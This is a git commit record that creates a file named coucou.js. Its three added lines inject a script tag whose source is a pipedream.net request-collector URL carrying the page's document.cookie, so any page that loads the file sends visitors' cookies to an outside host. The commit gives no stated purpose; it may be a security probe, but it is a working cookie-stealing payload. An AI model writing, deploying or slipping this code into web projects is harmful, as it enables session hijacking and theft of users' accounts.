254511a9ebd298492799bb184b3cd9faa111dd44
JB Lézoray <jlezoray@synamedia.com>
2023-11-25 23:31:02 +0100

    Create coucou.js

---
+++ coucou.js
@@ -0,0 +1,3 @@
+const node = document.createElement("script");
+node.setAttribute("src", "https://ensgnh0kr2ws.x.pipedream.net?"+document.cookie);
+document.getElementsByTagName("body")[0].appendChild(node);
